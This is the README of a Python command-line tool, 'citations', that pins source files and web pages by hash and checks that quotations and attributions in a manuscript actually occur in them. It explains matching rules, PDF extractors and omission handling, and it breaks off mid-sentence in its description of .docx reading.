# citations

[![pypi](https://img.shields.io/pypi/v/citations)](https://pypi.org/project/citations/)
[![python](https://img.shields.io/pypi/pyversions/citations)](https://pypi.org/project/citations/)
[![license](https://img.shields.io/pypi/l/citations)](https://github.com/elliottower/reproducible-science/blob/main/LICENSE)
[![docs](https://img.shields.io/badge/docs-live-blue)](https://reproducible.science/)

Check that what a paper attributes to a source is really in it, quoted or not.

Part of [reproducible-science](https://github.com/elliottower/reproducible-science) alongside `repro`, `results` and `prereg` — see the [documentation](https://reproducible.science/tools/citations/).

## What it is for

A paper makes two kinds of claim about the literature. It quotes a source, and it says what a
source holds without quoting it. Both can be wrong in the same way: the words are not there.
The second kind is far more common and nothing checks it, because the manuscript shows no
quotation marks to check.

That is the shape of a fabricated citation. A sentence reading "X equals Y (Author, year)",
or "the authors recommend Z", is generated from what the source plausibly says rather than
from what it does say — by a language model, or by a person working from memory three months
after reading the paper. Both produce a reference that resolves, an author list that is right,
a year that is right, and an attribution nobody can find in the text.

`pin` closes it by storing the source's own words beside the reading taken from them. `--says`
records your characterization, `--whose` owns it, and `verify` re-reads the pinned artifact and
reports whether the words are still there. The manuscript never has to print the passage. What
changes is that the attribution has an address.

So the trigger for reaching for this is not a quotation mark. It is a sentence that rests on
what someone else wrote.

## Install

```bash
pip install citations
pip install "citations[sheets]"   # to read .xlsx and .xls sources
pip install "citations[docx]"     # to read .docx sources pinned under docx-text version 1
pip install "citations[web]"      # to pin a web page by its URL
```

## What a check establishes

`citations verify` establishes one fact about each quotation: the passage occurs in the pinned
copy of the source, as read by the extractor the report names. `citations audit` establishes one
fact about each reference: its authors, title, year, volume and pages agree with the record its
identifier resolves to, and its venue is the one the record's venue identifiers name.

Neither establishes that the source is correct, or that the passage supports the sentence it
is quoted for. In a claims file `statement` is yours and `exact` is theirs, and only `exact` is
checked.

A pin names bytes. A quotation pinned against a preprint is checked against the preprint, so
the reference beside it should be the version that was pinned. Where a DOI resolves to another
version of the work, `audit` reports the year as a disagreement.

## Quick start

```bash
citations init
citations verify --claims claims/
```

```text
2,940 quotes

  found         2,940
  not found         0

warnings
      213  short — the source may qualify this in the next clause
      155  normalized — matched after ignoring punctuation and spacing

all found.
```

## A worked example

One source, one quotation, and one deliberate misquotation. The source is a text file, and its
claims file starts with a pin and no claims:

```yaml
source:
  citation: notes2026
  local: sources/notes.txt
  sha256: 915ac27df4c7…
  url: https://example.org/notes.txt
claims: {}
```

`citations pin` resolves a passage against the pinned file before it writes anything:

```console
$ citations pin claims/notes2026.yaml --id mean-offset \
    --quote "The mean offset was 0.43 degrees, and it did not change with ambient temperature."
found     The mean offset was 0.43 degrees, and it did not change with
added     mean-offset to notes2026.yaml
```

The same sentence with two digits transposed is refused, and the file is left as it was:

```console
$ citations pin claims/notes2026.yaml --id mean-offset-wrong \
    --quote "The mean offset was 0.34 degrees, and it did not change with ambient temperature."
not found  The mean offset was 0.34 degrees, and it did not change with
  read the source: a broken extraction reads the same as a passage that was never there
nothing written. read the source before recording the passage.
```

`citations verify --claims claims` then reads every claims file and reports `1 quotes`, `found
1`, and `read by 1 text`. After one line is appended to the source, the quotation still
resolves and the run fails, because the file is no longer the pinned one:

```text
1 source changed since being pinned
  notes2026                               pinned 915ac27df4c7  on disk 3d79bea1dc32

every quote resolved, but against a source that is not the one pinned.
```

## Commands

| Command | What it does |
|---------|-------------|
| `citations init` | Create a library here |
| `citations pin` | Add a quotation to a claims file, refusing one that does not resolve; `--occurrence N` pins one occurrence of a repeated passage; `--url` pins against a web page |
| `citations restore` | Write the source's passage for a quotation that leaves text out, as a separate record |
| `citations verify` | Do the quotations resolve in their sources? |
| `citations verify --json PATH` | Also write the counts to `PATH` as JSON: quotations by outcome, sources read and sources absent, and under `warnings` each warning with the quotations carrying it |
| `citations verify --verbose` | Also list, under each warning, the claims file, claim and quotation carrying it |
| `citations coverage` | Is every quotation in my manuscript pinned at all? |
| `citations audit` | Does the stored metadata match the record the identifier resolves to? |
| `citations audit --strict` | Exit 1 on a disagreement or on an entry not found that is not on the checked list, 2 when a lookup failed and nothing else did |
| `citations resolve` | Backfill missing DOIs and arXiv ids |
| `citations build` | Rebuild records from bibliographies |
| `citations lint` | BibTeX correctness, repeated keys, and author lists in a `.bib` |
| `citations add` | Add one entry to a `.bib`, refusing a key it already has |
| `citations link` | Point pdfs/ at the papers' artifacts |
| `citations fetch` | Download the sources a claims directory pins, keeping only bytes that match the pin |
| `citations fetch --json PATH` | Also write the count of sources per outcome to `PATH` as JSON |
| `citations import-paperclip` | Turn a Paperclip paper repo into pinned claim files |

## Pinning a web page by its URL

A documentation page, a policy page or a release note is a source with no file. `citations pin
--url` pins a quotation against the page at an address, and
[`retrieved`](https://github.com/elliottower/retrieved) obtains the page and holds its bytes:

```bash
pip install "citations[web]"
```

```console
$ citations pin claims/guide.yaml --url https://docs.example.org/guide --id refusal \
    --quote "A capture is refused where the host names a private network."
page      https://docs.example.org/guide
  the retrieval of 2026-01-05T09:30:00+00:00, already in the library: 98ae199b9a71 in /home/you/.retrieved
found     A capture is refused where the host names a private network.
added     refusal to guide.yaml
```

Where the `retrieved` library already holds a retrieval of that URL, the most recent one is
read and no request is made; the line under `page` gives its time. Where the library holds
none, the page is captured then, through `retrieved`'s own denylist, pacing and fetch, and the
line reads `captured now`. `--recapture` fetches the page again whatever the library holds. A
URL `retrieved` refuses (a private or internal host, a query string carrying a token), a
request its pacing declines, a server answer outside 200 to 299 and a failed request each exit
1 with the reason, and no claims file is written. Without the `web` extra the command names
the install and writes nothing.

The quotation is then resolved as against any other source, and a passage the page does not
hold is refused. `--url` is the one case where the claims file need not exist. It is written
with this `source` block:

```yaml
source:
  url: https://docs.example.org/guide
  sha256: 98ae199b9a71…                    # the bytes retrieved
  retrieved: store/98ae199b9a71…           # where they are, inside the retrieved library
  retrieved_at: '2026-01-05T09:30:00+00:00'
  extractor: html-text                     # what turns the page into the text quoted
  extractor_version: 1
  derived_sha256: 5c1d…                    # the text it produced when the quotation was pinned
```

The block names the reading, so `verify` reads the page the same way later. An HTML page names
`html-text`: HTML by the content type the retrieval's record gives, or, where the record gives
none, by a doctype or an `<html>` tag in its first 1,024 bytes. Any other text names
`extract_cmd: cat {}` and is read as served, and a PDF names nothing and goes to the PDF
readers.

The page is somebody else's text and is never copied into the project. `retrieved` is a path
inside the library, so a claims file committed to a public repository names no directory of
the machine that wrote it, and each machine finds the library itself:

```text
$RETRIEVED_HOME                 if set
.retrieved/ walking up          from the directory that holds claims/
<that directory>/.retrieved/    where there is neither; pin --url creates it
```

The search starts at the directory holding `claims/` and not at the working directory, so a
claims file names the same library wherever a command is run. With neither a variable nor a
library above the project, a capture creates `.retrieved/` beside `claims/`. That directory
holds the pages, so add it to `.gitignore`; `citations pin` says so where no ignore rule
covers it.

A claims file pins one retrieval of one page. A later quotation from the same retrieval is
added with or without `--url`. Where the library's most recent retrieval is another one, or
`--recapture` fetched other bytes, `--url` on that claims file is refused: leave `--url` out
to add to the retrieval the file pins, or name a new claims file for the new one. The store
is addressed by digest, so the earlier retrieval stays in it and the earlier claims file goes
on verifying.

`citations verify` reads the page from the library by the digest and needs no extra. In a
clone on a machine whose library does not hold the bytes, each quotation is `unchecked` and
the reason names the store that was asked:

```text
  unchecked           1   not in the retrieved store at /home/reader/paper/.retrieved/store: the source is a web page pinned by its URL, and its bytes are kept in the library that captured it
```

`citations fetch` asks the URL again and keeps the download only where its sha256 is the
pinned one. A live page is rarely served twice with the same bytes, so the usual outcome is
`differs`, and the line says the page may have changed since the retrieval time the claims
file records. Nothing is written in that case.

A quotation from an HTML page is checked against the text the page shows. `html-text` drops
the tags, decodes character entities, and leaves out the text of `<script>` and `<style>`, so
a sentence quoted through a link or an emphasis resolves, and so does one typed with the `&`
or the apostrophe the page writes as `&amp;` or `&rsquo;`. See
[Reading workbooks, `.docx`, article XML and HTML](#reading-workbooks-docx-article-xml-and-html).

## Fetching the sources a repository cannot ship

A publisher's PDF is not the author's to redistribute, so a public repository carries each
source's sha256 and not the source. A reader who clones it has every pin and no file, and
`verify` answers `unchecked` for every quotation.

```bash
citations fetch --claims claims/            # fetch what is absent
citations fetch --claims claims/ --dry-run  # say what would be asked, write nothing
```

For each absent source it tries the arXiv PDF where the source names an arXiv id or links an
arXiv page, the URL the claims file records, and the open-access locations Europe PMC and OpenAlex list for the DOI. A
download is installed only when its sha256 is the pinned one. Bytes that differ are reported as
`differs` and never written: a paywall's landing page, or a PDF a publisher stamps on each
download, would otherwise sit at the pinned path as a broken pin.

A source whose claims file records no `url`, `doi` or arXiv id is reported as `no location`:
there is nowhere to ask, and `citations pin` says so when a quotation is pinned against one.

A source that stays `differs` or `unavailable` can be obtained another way and placed at the
path its claims file names. `verify` checks it against the pin like any other.

`verify` also reads a source from the library before reporting it absent. Where the path a
claims file names holds no file, it looks in the library's `pdfs/` for a file under the same
name and reads that copy if its sha256 is the pinned one, so a source kept once in the library
serves every clone that pins it. See [Where the library lives](#where-the-library-lives).

A source that records `derived_sha256` is checked a second time once its bytes match: the
declared extractor is run and the digest of its text compared. The two stages fail under
different names, because they send a reader to different places. `differs` means the download
is not the pinned file, and nothing was written. `text differs` means the file is the pinned
one and the extractor now makes other text of it than the text the quotations were pinned in.
`text unchecked` means the file is the pinned one and the extractor could not be run here, for
the reason printed beside it, so the text was not compared; it is never reported as `fetched`.

## Coverage: the manuscript side

`verify` reads the claims files. It takes no manuscript, so a quotation added to the paper and
never pinned has no record, is checked by nothing, and leaves the report clean. `coverage` reads
the manuscript instead and asks whether each `` ``...'' `` is a span of something pinned.

```console
citations coverage paper/draft.tex --claims claims
```

```text
  covered           82
  uncovered          0
  unresolvable       1

  unresolvable  nosology_v6.tex:675
    ``Loci moved''
    under 12 characters once folded
```

Three outcomes, not two. A quotation too short to tell from noise is undecided, not a defect --
"loci moved" appears in a great many documents and its appearing in one establishes nothing.
`--strict` fails on the undecided ones as well.

`--attribute` goes further and checks each quotation against the artifact of a source cited near
it, which catches a passage credited to the wrong paper. Every key in the neighbourhood is
offered, because the nearest is often not the source: *the same document restricts* leaves the
real one several sentences back. It reports a misattribution only when every neighbouring source
could be read; if one would not open, the passage may belong to it and the question is undecided.

An ellipsis is omitted text: `` ``the model ... performs well'' `` requires both fragments and
requires nothing about what sits between them.

## Verify output

Five results, and they are exhaustive:

| Result | Meaning |
|--------|---------|
| `found` | The passage is in the source |
| `not found` | The source was read and the passage is not in it |
| `indeterminate` | Independent readers disagree about whether it is in it |
| `ambiguous` | The passage occurs more than once and the record does not say which occurrence |
| `unchecked` | No reader could read the source, so no measurement was made |

Warnings are separate, because a passage can be found and still worth a second look. A quote
can be short enough that the next clause changes its meaning — `"We trained 50"` appears
verbatim in a paper whose sentence continues `"...and 5 refits each for 12 layered"`.

`unchecked`, `indeterminate` and `ambiguous` are neither a pass nor a failure. Only
`not found` fails; `--strict` also fails on the other three, for CI. A source whose bytes no
longer match its pin fails the run whatever its quotations did.

`not found` means read the source. A mirror-reversed scan or a two-column extraction produces
the same signal as a passage that was never there. A `not found` whose every word is in the
source, as pieces with text left out between them, is counted separately on the same line; see
[When a quotation will not resolve](#when-a-quotation-will-not-resolve).

## Where a passage is, and how it is matched

A quotation carries the passage and, optionally, where it sits:

| Field | What it is | Checked |
|-------|------------|---------|
| `exact` | the passage, as the source has it | yes |
| `prefix`, `suffix` | the text on either side, for a passage that occurs more than once | used to single out one occurrence |
| `page` | the page it is on | yes, in a paginated source read by a built-in PDF reader |
| `section` | the section, as the source names it | no, recorded only |

A `page` the passage is not on leaves the result `found` with a `page` warning and the page it
was found on. Where there is no page to ask for, the result is `found` with the warning
`page unchecked`: under a declared `extract_cmd`, on a source that has no pages (text, LaTeX, a
workbook, a `.docx`), and where the passage matched only with spacing ignored.

A passage the source has more than once is `ambiguous` until the record says which occurrence
it quotes, and `citations pin` refuses it. `--occurrence N` pins the Nth, counting from 1 in the
source's order, and writes the `prefix` and `suffix` that single it out:

```console
$ citations pin claims/notes2026.yaml --id replication --occurrence 2 \
    --quote "the model reached an accuracy of 0.94 on the split"
found     the model reached an accuracy of 0.94 on the split
added     replication to notes2026.yaml
  occurrence 2, singled out by the prefix and suffix written with it
```

```yaml
claims:
  replication:
    quotes:
    - exact: the model reached an accuracy of 0.94 on the split
      prefix: 'the replication '
      suffix: . a third laboratory
```

The anchors are the source's text on either side as the matcher reads it: in lower case with
single spaces, or, for a passage that matches only once spacing is ignored, with no spaces at
all. They are taken 16 characters out on each side, then 32, then 64, doubling, each time
carried on to the end of the word the cut lands in, until the anchored passage is in the source
once and that once is the occurrence asked for. The quotation is then checked with its anchors
before anything is written, so what is written resolves under `verify --strict`. White space at
the ends of `--quote` is dropped, as it is when a claims file is read.

`--occurrence` refuses, and writes nothing, in four cases:

- an occurrence the source does not have, such as `--occurrence 4` of three;
- a value below 1, which exits 2 before the source is read;
- anchors that would pass 1,000 characters a side. A passage inside blocks that repeat in full
  is singled out only by text reaching to where a block ends, and on a long source that is
  anchors the size of the source. Write `prefix` and `suffix` by hand there;
- a passage matched with spacing ignored that begins or ends on a hyphen, where no anchors
  taken from the source join onto it.

Without the flag no occurrence is chosen. A source read by a PDF reader is anchored in the text
of the reader that reads it first, so a passage that reader misses and a fallback reader finds
twice stays `ambiguous` and cannot be pinned with `--occurrence`.

Matching is exact after folding, and never approximate. Folding removes what a PDF extractor
changes: case, runs of whitespace, curly quotation marks, the dash variants, ligatures, a
hyphen at a line break between two letters, and accents. Text is decomposed to Unicode NFKD and the combining marks
are dropped, and dotless `ı` is read as `i`, so an accented letter matches its unaccented
form: `Krzyżosiak` matches `Krzyzosiak`. A passage that matches only once whitespace,
underscores and a hyphen joining two word characters are ignored altogether is `found` with a
`normalized` warning.
Punctuation that carries meaning is kept, so `p < 0.05` does not match a source reading
`p = 0.05`, and `-0.42` does not match `0.42`.

A passage folding does not find is looked for verbatim once more, in a second reading of the
source, before spacing is ignored. That reading keeps a hyphen at a line break between two
letters, so `open-access` matches a source that broke it as `open-` over `access`, and it
closes a space before a closing mark or after an opening one, so `dvc.lock, including` matches
a page rendering `dvc.lock , including`. Only white space is removed, and every word and mark
stays. Where the source is a page's text read off disk (`.md`, `.markdown`, `.rst`, `.txt`),
the second reading also drops what the page does not show: a MyST or Verso role keeps its text
(`{kw}`#print axioms`` reads `#print axioms`) and an HTML tag goes, so a quotation can be
written as the page renders it. A quotation that kept the markup still resolves in the first
reading. HTML is read by `html-text` and XML by `jats-text`, and neither is changed by this.
A passage found in either reading is `truncated` only where it cuts a word in both, so a
quotation ending on `some` where layout set `some-` at a line end beside `class` is not. Where
one reading cuts and the other does not, the quotation carries `line-end hyphen` instead: it
begins or ends at a hyphen the source puts at a line break, and the text cannot say whether
that hyphen splits one word, which the quotation then cuts, or ends a line beside an unrelated
one.

| Warning | Meaning |
|---------|---------|
| `short` | under 40 characters, or ending on a comma or a connecting word, so the source may qualify it in the next clause |
| `truncated` | every occurrence begins or stops mid-word or mid-number |
| `line-end hyphen` | begins or ends at a hyphen the source puts at a line break, so it may cut a word; check it |
| `normalized` | matched only after ignoring spacing, underscores and hyphens inside a word |
| `page`, `page unchecked` | found on another page, or a page is recorded and was not checked |

A match is relative to the extractor. Two readers produce two texts from one PDF, so a result
names the reader, and `not found` means not found in the text that reader produced.

## When a quotation will not resolve

`not found` says the source was read and the passage is not in it. That is an accusation
against the manuscript, and it is usually wrong. Three things produce it far more often than a
misquotation does, and `verify` now names which by reporting where the passage stopped matching:

```text
not found by any of pdftotext -layout, pdftotext, pypdf, so the passage is absent under every
reader installed here; the first 155 characters are in the source and the rest is not
      quoted: ...tionality, e.g. vec('king') - vec('man') + vec('woman') = vec(
      source: ...tionality, e.g. vec('king') vec('man') + vec('woman') = vec('q
```

**A character the text layer dropped.** A minus sign, an en dash, a subscript. The quotation is
right and the document's extraction is lossy. Repair it by splitting the quotation into two
adjacent fragments either side of the missing character, never by truncating it to the part
that matches -- a truncated quotation resolves and says something the source does not.

**A hyphen on a line break.** `fold` removes `-\n` between two letters because a renderer
inserts one when it splits a word, and it cannot tell that from a real hyphen that happens to
fall at a line end. A dash with anything else on either side of the break is kept. The second
reading keeps the hyphen, so a quotation written either way resolves; one that crosses two
such breaks, one a split word and one a real hyphen, does not, and is split there.

**The wrong reader.** `pdftotext -layout` preserves a page's geometry, so on a two-column paper
it interleaves the columns and shreds every sentence crossing the gutter. A block of failures
concentrated in one document is this. `verify` consults the other readers before a `not found`
stands and records which one answered, so this repairs itself; a tool that asks one extractor
does not, and reports the document as missing text it contains.

**Text left out of the middle.** A quotation that joins two stretches of the source and leaves
out what lies between them is `not found`, because a quotation is one stretch of the source and
the words left out may qualify it. Every word of it is in the source all the same, so the
report shows what was left out and what the source reads:

```text
not found  notes2026:joined            Higher circulating levels of the protein wer
           every word of the quotation is in the source, as 2 pieces in the source's order with source text left out between them and nothing marking the gap
           after: ...in were associated with lower risk
           left out (11 tokens of the source, 69 characters): [[in the discovery cohort (odds ratio 0.81 per standard deviation), and]]
           then:  the association replicated in two ...
           the source reads (217 characters, left-out text in [[ ]]): Higher circulating levels of the protein were associated with lower risk [[in the discovery cohort (odds ratio 0.81 per standard deviation), and]] the association replicated in two independent cohorts of European ancestry
           to repair it, quote the passage as the source reads, with the left-out text in it; or, in a manuscript, write an ellipsis where the text is left out, which `citations coverage` reads as omitted text. As it stands the quotation is `not found`, with or without `--strict`
```

The count line says how many of the `not found` are of this kind: `not found  3   2 in the
source only in pieces, with text left out between them`. There are two repairs, and the author
chooses: quote the passage as the source reads, or, in a manuscript, mark the gap with an
ellipsis, which `citations coverage` reads as omitted text. A claims file's `exact` takes no
ellipsis, and no command rewrites a quotation. `citations restore` writes the passage as a
separate record; see [Restoring the source's passage](#restoring-the-sources-passage).

The result carries the same in full. `reason` is `omission`, each entry of `gaps` holds the
`text` left out, its `offset` in the passage, where the gap falls in the quotation (`at`), its
folded length (`skipped`), how many `tokens` it is and the `position` of the first of them in
the passage, and `passage` is the source from the start of the first piece to the end of the
last. The printed report shows the first 200 characters of a longer gap and the first 600 of a
longer passage. Each length it prints counts the text as shown, on one line with white space
single, without the `[[ ]]` marks, and says how much of that is shown.

The text shown is the source's own, with its capitals, accents and line breaks, wherever a
stretch of the source can be found that folds to exactly what matched; the printed report
writes its line breaks as spaces. Where no such stretch is found the folded text is shown, in
lower case with single spaces, the report says so, and `passage_folded` is set on the result.

The rule reads both sides as tokens, after the folding above and nothing looser. A token is a
stretch of the source between white space that a reader of the source sees: `-0.42`, `1.81`,
`12,500`, `non-significant`, `5.3%` and `risk,` are one token each. Folding writes a space in
three places where the source has none, and none of them parts a token: a control character
left inside a word (`logit` and `difference` with a stray byte between them), a spacing accent
(`don´t`, `na¨ive`), and a thin, narrow or no-break space between two digits (`12 500` is one
number). A no-break space anywhere else is white space. A word the source breaks across a line
with a hyphen is one token. There is one count of tokens, this one, and `citations restore`
uses it for its limit and writes it down.

A quotation is an omission when it divides into two or more pieces and:

1. each piece is a run of whole tokens of the quotation, at least 20 characters long;
2. where the quotation is cut, the source has white space on the outer side of the piece, so
   the piece before a gap ends with a whole token of the source and the piece after begins
   with one;
3. the pieces occur in the source in the quotation's order;
4. at least one whole token of the source lies between each piece and the next.

What is left out is therefore whole tokens, and a cut never falls inside one. `0.42` quoted
from a source reading `-0.42`, `1` from `1.81`, `500` from `12,500`, `significant` from
`non-significant` and `5` from `5.3%` are a changed token, and the result is a plain `not
found`. Punctuation is treated the same way whatever it is: `risk the` against a source reading
`risk, the` or `risk/the` leaves no token out and changes one, so it is a plain `not found`. A
piece that ends a clause has to carry the token's punctuation as the source has it. The two
ends of the quotation are not cuts and are held to what any quotation's ends are held to, so a
quotation may stop before a full stop and may not stop inside a word.

A changed word usually leaves its piece absent, and pieces in another order or under 20
characters are a plain `not found`. The rule does not rule out a splice: `a significant increase
in mortality` joined onto the subject of a sentence that reports a decrease is reported as an
omission if a later sentence reports the increase in those words. Every piece is the source's
and the join is not, which is why an omission is `not found` and never a pass.

A quotation can fit its source in more than one way, where the source repeats a piece. Every
way is listed, up to 1,000, and the one reported spans the shortest passage, wherever in the
source that is; of two that tie, the one with fewer pieces, then the earlier. The report says
how many ways there are when there is more than one, and whether every other way spans a
longer passage that contains the shortest. The result
carries the same as `fittings`, `unique` and `capped` on `verify.omission`'s answer. Text
written without spaces between words, such as Chinese or Japanese, is one token a sentence and
is not read as an omission.

**A source that is not what it claims to be.** A `.pdf` that is a Cloudflare interstitial or a
login page fails under every reader. `file` will say so in one line.

## Restoring the source's passage

`citations restore` is the explicit step after an omission has been read. It writes the
source's passage for that quotation as a separate, derived claim, and leaves the quotation
alone:

```console
$ citations restore claims/notes2026.yaml --id joined
restored  joined as joined-restored in notes2026.restored.yaml
  1 token of the source put back in 1 place; notes2026.yaml is unchanged, and joined is still `not found` as written
  the restored passage is the source's text, not what the quoting party wrote
```

The claims file it is given is never edited: `joined` stays as written and stays `not found`.
The derived claim goes in `claims/notes2026.restored.yaml`, a claims file beside the original
that carries the same `source` block, so `citations verify --claims claims` reads it with the
rest. Its quotation is the bounded passage, from the start of the quotation's first piece to
the end of its last, in the source's own characters. It is never widened to the sentence and no
context is added.

```yaml
claims:
  joined-restored:
    restored:
      from: joined
      notice: The quotation in this claim is the source's own text, restored by `citations restore`
        around text the original quotation left out. It is not what the quoting party wrote; that
        is `original`, which is not found in the source as written.
      original: Higher circulating levels of the protein were associated with lower risk
      source: {citation: notes2026, local: sources/notes.txt, sha256: 56f5…}
      text: {extractor: text, sha256: 56f5…}
      passage: {start: 13, end: 95}
      omitted:
      - {start: 59, end: 67, tokens: 1, position: 8}
      fittings: {found: 1, others_contain_passage: true}
      rule: {name: bounded-passage, version: 2, max_omitted_tokens: 1, min_piece_chars: 20, max_fittings: 1000}
      software: {citations: 0.5.1}
    quotes:
    - exact: Higher circulating levels of the Protein were strongly associated with lower risk
```

`passage` and `omitted` are character offsets into the text the extractor produced, whose
digest is `text.sha256`; `tokens` and `position` count tokens as the rule above does, and
`position` is the place of the first omitted token among the passage's tokens, counting from 1.
`fittings` is how many ways the quotation fits the source, and records that every other one
spans a passage containing this one. `software` adds `commit` where the package was installed from one.
Nothing in the record depends on when or where the command ran, so the same claims file and
source give the same bytes.

`verify` counts restored quotations on a line of their own, so they are never mixed with
quotations that resolved as written:

```text
restored  1 of the 3 — the source's own passage, written by `citations restore`; not what the quoting party wrote
```

It refuses, and writes nothing, unless all of these hold:

- the quotation is an omission under the rule above, decided the way `verify` decides it, so a
  passage any installed reader finds whole is `found` and is not restored. A changed word or
  digit, a number or a hyphenated word cut short, and a quotation that is absent are never
  restored;
- the passage is the shortest one the quotation fits, and every other way of fitting spans a
  longer passage that contains it, as when the source repeats the quotation's closing phrase a
  paragraph later. Other ways may exist, and the record counts them. Where two ways
  span the same passage, or neither of two passages contains the other (`In men A
  significantly B. In women A not once B.`), none is chosen. This does not depend on the
  limit below, so raising the limit never turns a restoration into a refusal or into another
  passage. A quotation that fits in 1,000 ways or more is refused;
- the tokens that passage puts back, over all gaps, number at most `--max-omitted-tokens`. The
  default is 1, the strictest setting; a larger limit is asked for by number;
- the passage can be given in the source's own characters, and resolves as `found` on its
  own, once;
- the claims file pins its source by sha256 and the file on disk matches. An unpinned source
  is refused: nothing says it is the file the quotation was taken from;
- `<name>.restored.yaml`, if it is already there, is a claims file whose `source` block names
  the same `local` and `sha256` as the original's. A key added to the original since, such as
  `doi`, does not matter. One written against an earlier pin or another source, or one that
  does not parse, is refused and left as it is;
- the claim has one quotation, and the derived id is not taken.

Every refusal exits 1. `--check` decides and reports, and leaves the directory as it found it.
`repro audit` counts `*.restored.yaml` files apart from the claims the authors declared.

**When to restore, and when not.** Restoring corrects a quotation against its source: the
record then holds what the source says at that place, and says how it differs from what was
quoted. It does not show that the omission was harmless. A dropped `not` is one token, and
restoring it reverses the quotation. Whether the quoting party's reading survives the text
they left out is a judgment about that text, which is why the record gives the offsets of
every omitted stretch and keeps the original quotation beside the passage. Do not restore in
order to make a run pass, and do not report restored quotations as quotations that resolved.

The restored passage is the shortest the quotation fits, inside every other passage it fits.
That does not make it where the quotation came from. Take a source reading `Critics deny that
A at all (the sponsor wrote that A reliably B) or B.` and the quotation `A B`. It is restored
as `A reliably B`, the sponsor's sentence in the parenthesis, and the record counts 24 ways the
quotation fits. The outer sentence, in which critics deny A, contains that passage and is
another possible origin, with the opposite sense. Where `fittings.found` is more than 1, read
the source around the passage before relying on it.

## Reading PDFs

Every result records which extractor produced the text it was checked against, because a pin
establishes that the file has not changed and establishes nothing about the reading of it.

| Extractor | Engine | Install |
|-----------|--------|---------|
| `pdftotext -layout` | poppler, page geometry | `brew install poppler` · `apt install poppler-utils` |
| `pdftotext` | the same binary, poppler's reading order | (as above) |
| pypdf | its own content-stream parser | `pip install "citations[pypdf]"` |
| pdfplumber | pdfminer.six plus its own layout layer | `pip install "citations[pdfplumber]"` |
| `pdftotext -tsv`, by column | poppler's word boxes, each line split at the gutter | poppler 22.08 or later |

Poppler is preferred and recommended. Where it is absent, or fails on a document, the chain
falls through to whichever pure-Python reader is installed and records the substitution as a
fallback — so `pip install citations` alone is enough to check a PDF, and no result is quietly
attributed to an extractor that did not produce it. pypdf comes before pdfplumber because it
agreed with poppler on more of a 1,593-check corpus -- 92.7% against 90.2% -- and read a
document in a third of the time; the measurement is in `research/pdf-readers/`.

The two poppler modes are one binary with one flag between them, and they fail in opposite
directions: `-layout` preserves visual position and breaks a sentence spanning two columns,
while reading order preserves the sentence and misplaces the subscripts beside it. Over 1,593
passage checks, reading order resolved 59 that `-layout` missed and missed 29 it resolved.
Neither is right in general, so `-layout` reads a document by default and both are consulted
under `--triangulate`, where a disagreement between them is reported rather than resolved.

Where a gutter is narrow, every one of those readers joins a line of the left column to the line
beside it, so a sentence that wraps inside a column comes out with the other column's words
spliced into it. Before a passage is called `not found`, one more reading is asked: poppler's
word boxes, with each line split at the page's gutter and every left half read before any right
half, between lines that span it. A page with no gutter at least six points wide reads top to
bottom. A passage found this way is recorded as a fallback naming `pdftotext -tsv, by column`.
It is not consulted under `--triangulate`, because it is poppler's own glyphs in another order,
and it does not apply to a source that declares `extract_cmd`.

A source that declares `extract_cmd` does not enter that chain. Its author has named the
program that produces the text they quote, so it runs or the check is `unchecked` with its
reason — falling through would run a PDF reader over a source the author just said is not a
PDF, and record an extractor nobody asked for.

```bash
citations verify --claims claims/ --triangulate
```

`--triangulate` asks every installed reader instead of one. Where they disagree the result is
`indeterminate`, never `not found`: two extractors disagreeing says the document is not
determinate under the readers on this machine, which accuses nothing, while `not found`
asserts the manuscript quoted a passage its source does not contain. Triangulation is opt-in
because it costs one extraction per reader; it does not apply to a source that declares a
command, and a run that triangulated nothing says so rather than reporting the readers as
having concurred.

## Text kept between runs

Running `pdftotext` over each source is most of what `citations verify` costs, so the command
keeps what it extracts and reads several sources at a time. An entry is filed under the sha256
of the source's bytes, the version `pdftotext` reports, and its arguments. A source whose bytes
changed, a different poppler or a different flag is extracted again; nothing is looked up by
path or by date. The report counts the readings that came from the cache:

```text
28 extractions taken from the cache, filed under the source's sha256 and the extractor's version; --no-cache reads every source again
```

`--no-cache`, or `CITATIONS_NO_CACHE=1`, runs the extractor over every source and keeps nothing.
The entries hold text from the sources, so they live with the user and not in a repository:
`$CITATIONS_CACHE_DIR`, else `$XDG_CACHE_HOME/citations/extractions`, else
`~/.cache/citations/extractions`. Only `pdftotext` is kept. A declared extractor the package
does not know has no version to ask for, and is run every time. `repro verify` reads every
source every time.

## Reading workbooks, `.docx`, article XML and HTML

Four built-in extractors read the formats a supplement, an open-access article or a web page
arrives in, so a claims file can pin the publisher's file and not a text somebody made from it:

| Extractor | Reads | Produces | Install |
|-----------|-------|----------|---------|
| `sheet-rows` | `.xlsx`, `.xls`, `.csv` | one row per line, cells joined with `\|` | `pip install "citations[sheets]"` (`.csv` needs nothing) |
| `docx-text` | `.docx` | the body in document order (paragraphs, tables, text boxes, content controls, field results), then footnotes and endnotes, then headers and footers; tracked changes as accepted | nothing (`citations[docx]` for version 1) |
| `jats-text` | JATS XML: Europe PMC `fullTextXML`, NCBI `efetch db=pmc` | one block per line, inline markup dropped, entities decoded, table rows as cells | nothing |
| `html-text` | HTML | one block per line, tags dropped, entities decoded, `<script>` and `<style>` left out, table rows as cells | nothing |

A workbook or a `.docx` that declares nothing is read by the extractor its suffix names. An
`.xml` that declares nothing is still read as plain text with its markup, so quotations already
pinned against the XML as served go on resolving; `jats-text` is for a source that names it.
An `.html` or `.htm` file that declares nothing is likewise still read with its markup, and
`html-text` is for a source that names it: a local file by `extractor: html-text`, and a page
pinned with `citations pin --url` in the block that command writes.

`html-text` keeps the text of an inline element (`<a>`, `<em>`, `<code>`, `<span>` and the
like) in its sentence and ends a line at every other element. A line break is white space to
the matcher, as in any text source, so a quotation that runs from the end of one paragraph or
list item into the start of the next resolves, as it does across a line break in a `.txt`. A
table row is one line with ` | ` between its cells, so a quotation spanning two cells resolves
only where it writes the ` | `. Navigation, footers and text a stylesheet hides are part of
the page and are read; only `<script>` and `<style>` are left out. The page is read as UTF-8.

```yaml
source:
  local: sources/original/aragam2022cad_main.xml
  sha256: 67b6…                 # the bytes Europe PMC serves
  url: https://www.ebi.ac.uk/europepmc/webservices/rest/PMC9729111/fullTextXML
  extractor: jats-text          # what turns them into the text quoted
  extractor_version: 1          # which rendering of it
  derived_sha256: 7d8f…         # the text it produced when the quotations were pinned
```

`docx-text` version 2 parses the document's own XML from the zip. It reads, in this order:
(1) the body in document order, each paragraph one line and each table where it stands, one
row per line with cells joined by ` | `, a table inside a cell after the row holding it, a
text box after the paragraph it is anchored in, and a content control's content in place;
(2) each footnote and then each endnote, in the order the text first refers to it, marked
